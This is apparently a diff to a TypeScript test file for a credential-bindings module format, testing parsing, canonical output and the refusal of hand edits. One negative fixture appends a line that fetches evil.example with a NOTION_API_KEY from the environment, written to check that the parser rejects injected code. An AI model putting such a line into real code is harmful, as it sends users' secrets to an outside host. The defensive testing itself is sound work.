@@ -3,8 +3,10 @@ import {
   applyBindingOverride,
   applyOverridesToProviders,
   emptyCredentialBindingsFile,
+  emitCredentialBindingsModule,
   parseCredentialBindingsFile,
-  parseCredentialBindingsText,
+  parseCredentialBindingsModule,
+  renormalizeCredentialBindingsModule,
   stringifyCredentialBindings,
   CredentialBindingsCodemodError,
   type CredentialBindingsFile,
@@ -34,7 +36,7 @@ const OV: CredentialBindingOverride = { provider: "notion", credential: "team-ke
 
 ok(parseCredentialBindingsFile({ overrides: [] }).overrides.length === 0, "parse: empty overrides");
 ok(parseCredentialBindingsFile({ overrides: [OV] }).overrides[0].secretRef === "db:notion:team-key", "parse: one override");
-ok(parseCredentialBindingsText('{ "overrides": [] }').overrides.length === 0, "parse: from text");
+ok(parseCredentialBindingsModule(emitCredentialBindingsModule(emptyCredentialBindingsFile())).overrides.length === 0, "parse: from module text");
 
 throwsWith(() => parseCredentialBindingsFile(null), "must be a JSON object", "parse: null refused");
 throwsWith(() => parseCredentialBindingsFile([]), "must be a JSON object", "parse: array refused");
@@ -60,9 +62,37 @@ const s1 = stringifyCredentialBindings(unordered);
 const s2 = stringifyCredentialBindings({ overrides: [...unordered.overrides].reverse() });
 ok(s1 === s2, "stringify: byte-identical regardless of input order (sorted by provider, credential)");
 ok(s1.endsWith("\n"), "stringify: trailing newline");
-ok(stringifyCredentialBindings(parseCredentialBindingsText(s1)) === s1, "stringify: parse∘stringify is a fixpoint");
+ok(stringifyCredentialBindings(parseCredentialBindingsModule(emitCredentialBindingsModule(unordered))) === s1, "stringify: parse∘stringify is a fixpoint");
 ok(s1.indexOf('"linear"') < s1.indexOf('"notion"'), "stringify: overrides sorted by provider");
 ok(/"provider"[\s\S]*"credential"[\s\S]*"broker"[\s\S]*"secretRef"/.test(s1), "stringify: canonical key order");
+
+{
+  const mod = emitCredentialBindingsModule(unordered);
+  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
+  ok(
+    mod.includes('\nimport type { CredentialBindingsFile } from "@open-everywhere/core/agent/access/credential-bindings-codemod.js";\n'),
+    "module: carries exactly one TYPE-ONLY import",
+  );
+  ok(mod.endsWith(" satisfies CredentialBindingsFile;\n"), "module: ends with the satisfies clause + newline");
+  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
+  ok(emitCredentialBindingsModule(parseCredentialBindingsModule(mod)) === mod, "module: emit ∘ parseModule is a fixpoint");
+  throwsWith(
+    () => parseCredentialBindingsModule(mod + 'await fetch("https://evil.example", { body: process.env.NOTION_API_KEY });\n'),
+    "must contain exactly one",
+    "module: a hand-added statement is REFUSED (the format admits no code)",
+  );
+  const tampered = mod.replace('"db:notion:team-key"', '"db:notion:attacker-key"');
+  ok(tampered !== mod, "module: (fixture) the secretRef edit actually changed the bytes");
+  ok(parseCredentialBindingsModule(tampered).overrides.length === 2, "module: (fixture) the tampered body is still well-shaped data");
+  const reordered = mod.replace('"provider": "linear"', '"provider": "zzz-linear"');
+  ok(reordered !== mod, "module: (fixture) the provider-reorder edit actually changed the bytes");
+  throwsWith(
+    () => parseCredentialBindingsModule(reordered),
+    "not in canonical form",
+    "module: a hand-edit that leaves the file non-canonical is REFUSED, not silently rewritten",
+  );
+  ok(renormalizeCredentialBindingsModule(reordered) === emitCredentialBindingsModule(parseCredentialBindingsFile({ overrides: [{ ...unordered.overrides[1], provider: "zzz-linear" }, unordered.overrides[0]] })), "module: renormalize produces the canonical form of the edited data");
+}
 
 {
   const empty = emptyCredentialBindingsFile();
@@ -125,7 +155,10 @@ const EXEC_OV: CredentialBindingOverride = {
   throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k", executor: { integration: "i:x", owner: "o", connection: "oe-c" } }] }), 'must not contain ":"', "parse: executor home colon-in-segment refused");
 
   const s = stringifyCredentialBindings({ overrides: [EXEC_OV] });
-  ok(s.endsWith("\n") && stringifyCredentialBindings(parseCredentialBindingsText(s)) === s, "stringify: executor override round-trips (fixpoint)");
+  ok(
+    s.endsWith("\n") && stringifyCredentialBindings(parseCredentialBindingsModule(emitCredentialBindingsModule({ overrides: [EXEC_OV] }))) === s,
+    "stringify: executor override round-trips (fixpoint)",
+  );
   ok(/"provider"[\s\S]*"credential"[\s\S]*"executor"[\s\S]*"integration"[\s\S]*"owner"[\s\S]*"connection"/.test(s), "stringify: executor override canonical key order (incl. ordered sub-object)");
   ok(!s.includes('"broker"') && !s.includes('"secretRef"'), "stringify: an executor override emits NO broker/secretRef keys");
 
